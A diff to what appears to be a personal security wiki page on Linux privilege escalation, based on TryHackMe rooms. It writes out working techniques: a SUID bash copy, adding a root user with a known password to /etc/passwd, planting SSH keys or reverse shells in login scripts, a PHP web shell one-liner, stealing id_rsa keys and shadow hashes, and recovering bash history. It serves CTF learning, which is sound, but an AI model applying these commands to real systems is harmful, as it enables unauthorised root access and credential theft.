@@ -1,6 +1,6 @@
 ---
 description: >-
-  Go from a low privilege user, to a higher one to gain access to thing you're
+  Go from a low-privilege user to a higher one to gain access to things you're
   not supposed to
 ---
 
@@ -8,7 +8,7 @@ description: >-
 
 If a system has been set up well, you might not instantly get all the privileges on the machine when you get in. It's pretty common to have a web server run as a low-privilege user, so if it ever gets hacked the attacker might not be able to do much on the server.
 
-The point of Privilege Escalation is to abuse features of the system to execute commands as more privileged users, and thus escalating your own privileges on the system.​ Most of the information was from the Linux PrivEsc rooms on TryHackMe:
+The point of Privilege Escalation is to abuse features of the system to execute commands as more privileged users, thus escalating your own privileges on the system.​ Most of the information was from the Linux PrivEsc rooms on TryHackMe:
 
 {% embed url="https://tryhackme.com/room/linprivesc" %}
 First PrivEsc room with some basic techniques
@@ -35,19 +35,24 @@ cp /bin/bash /tmp/bash; chmod +xs /tmp/bash
 uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
 </code></pre>
 
-### Write files
+### Writing files
 
-If you can only write to files, without running commands, you can write to some specific locations to later execute commands. If you can append data to a file, try adding a root user to `/etc/passwd` with a password that you know yourself. Then you can log in as that user and get root privileges:
+If you can only write to files, without running commands yet, you can write to some specific locations that will later execute commands. Profile files such as `.bashrc` or `.profile` contain scripts that are executed every time the user logs in, and you may be able to hide a reverse shell command here to trigger whenever the user logs in again.&#x20;
 
-<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ openssl passwd hacker  # Generate password
+If you are able to write at some place with code that is executed by another user, try overwriting this code with a reverse shell or anything else you want them to do. For example a PHP shell like `<?= system($_GET["cmd"]) ?>` to run commands on a website. This really depends on what technologies exist on the system, but overwriting libraries may also be an option.&#x20;
+
+For an instant trigger, the root user may edit `/etc/passwd` to add another root-level user with your own password. Then you can log in as that user and get root privileges:
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ openssl passwd 'hacker'  # Generate password
 </strong>aQeFa8LxllpT.
 </code></pre>
 
-Then if you somehow append this following line to the `/etc/passwd` file, you will be able to log in as root using the password "hacker":
+Then if you somehow append the following line to the `/etc/passwd` file, you will be able to log in as root using the password "hacker":
 
-```shell
-hacker:aQeFa8LxllpT.:0:0:root:/root:/bin/bash
-```
+<pre class="language-shell"><code class="lang-shell">root:x:0:0:root:/root:/bin/bash
+...
+<strong>hacker:aQeFa8LxllpT.:0:0:root:/root:/bin/bash
+</strong></code></pre>
 
 <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ su hacker
 </strong>Password: hacker
@@ -55,7 +60,7 @@ hacker:aQeFa8LxllpT.:0:0:root:/root:/bin/bash
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
 
-If the box uses SSH, another way would be to append your own public key to the `.ssh/authorized_keys` file in their home directory. This allows you access to the user via SSH because you were explicitly allowed to. Just `cat` out your own `~/.ssh/id_rsa.pub` starting with `ssh-rsa`, and copy it to a new line in the `.ssh/authorized_keys` file. Then you are allowed to log in simply using SSH:
+If the machine uses SSH, another way would be to append your own public key to the `.ssh/authorized_keys` file in the target's home directory, which permits you access to the user via SSH. Just `cat` out your own `~/.ssh/id_rsa.pub` starting with `ssh-rsa...` and add it to a new line in the `.ssh/authorized_keys` file. Then you are allowed to log in simply using SSH:
 
 ```shell-session
 $ ssh root@$IP
@@ -64,15 +69,14 @@ $ ssh root@$IP
 {% hint style="warning" %}
 Default installations of SSH don't allow logging in as `root`. To check this look at the `PermitRootLogin` option in `/etc/ssh/sshd_config`:
 
-```shell-session
-$ grep PermitRootLogin /etc/ssh/sshd_config
-PermitRootLogin yes
-```
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ grep PermitRootLogin /etc/ssh/sshd_config
+</strong>PermitRootLogin yes
+</code></pre>
 {% endhint %}
 
-### Read files
+### Reading files
 
-Being able to read files as a privileged user can allow you to read sensitive information. The first is the shadow hashes in `/etc/shadow`, which you can then copy to your own machine to crack (See more info in [#cracking-shadow-hashes](../../cryptography/hashing/cracking-hashes.md#cracking-shadow-hashes "mention")). Then if you have cracked a password you can just log in as that user using `su`:
+Being able to read files as a privileged user can allow you to read sensitive information. If you are reading as the `root` user, you may read the shadow hashes in `/etc/shadow`, which can be cracked locally to find users' passwords (See more info in [#cracking-shadow-hashes](../../cryptography/hashing/cracking-hashes.md#cracking-shadow-hashes "mention")). Then if you have cracked a password you can just log in as that user using `su`:
 
 <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ su root
 </strong>Password: password123
@@ -89,9 +93,9 @@ www-data /var/www
 user /home/user
 </code></pre>
 
-This folder often contains an `id_rsa` file which is only readable by the user, but contains the private key that can be used to log into SSH as that user. When you are able to read this file, copy it to your attacking machine and use `ssh -i` to use the private key:
+This folder often contains an `id_rsa` file that is only readable by the user, but contains the private key that can be used SSH into that user. When you are able to read this file, copy it to your attacking machine and use `ssh -i` to use the private key:
 
-<pre class="language-shell-session" data-title="Attacker"><code class="lang-shell-session"><strong>$ cat id_rsa  # Saved private key
+<pre class="language-shell-session" data-title="Attacker"><code class="lang-shell-session"><strong>$ cat id_rsa  # Downloaded private key
 </strong>-----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAtc7FngGLGz9oReOq2b7k2grTgvQGtP+Yax3it73ZGuxASVKq
 ...
@@ -102,3 +106,9 @@ BAmcHcSorWfiOeasmS2HsoAqsBJr8DqDVAo4274CYxZooDqq+6Rimg==
 </strong># id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
+
+### Deleting files
+
+This is a bit of a special case, but if you have a primitive to delete an arbitrary file, you may be able to remove files that protect a service normally but still work without the file. You may find that an application replaces a **configuration file** with the default if it cannot find it, resetting any extra protections an admin may have put on it.&#x20;
+
+Another trick is when the target user does not want to be spied on, so they symlink their `~/.bash_history` to `/dev/null`. This is a common default configuration in some places as well. When you **delete** this file it will remove the symlink, and bash will simply create the file and write to it when the next command is executed that should be put in the history. You may be able to read sensitive command-line arguments like passwords or other secrets if it is readable by you.&#x20;
